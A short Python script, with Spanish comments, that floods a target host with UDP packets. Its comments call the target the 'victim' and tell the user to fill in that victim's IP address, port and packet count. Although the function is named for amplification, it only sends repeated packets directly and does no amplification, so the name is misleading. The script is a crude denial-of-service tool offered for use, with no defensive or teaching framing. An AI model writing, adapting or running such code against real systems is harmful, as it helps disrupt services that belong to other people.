import socket

def send_udp_amp(address, port, message, num_packets):
    # Crea un socket UDP
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for _ in range(num_packets):
            # Envía el mensaje a la dirección y el puerto de la víctima
            s.sendto(message, (address, port))

if __name__ == "__main__":
    # Reemplace esto con la dirección IP y el puerto de su víctima
    target_ip = "192.168.1.100"
    target_port = 80

    # Reemplace esto con el mensaje que desea enviar
    message = b"Hello, world!"

    # Reemplace esto con el número de paquetes UDP que desea enviar
    num_packets = 1000

    send_udp_amp(target_ip, target_port, message, num_packets)
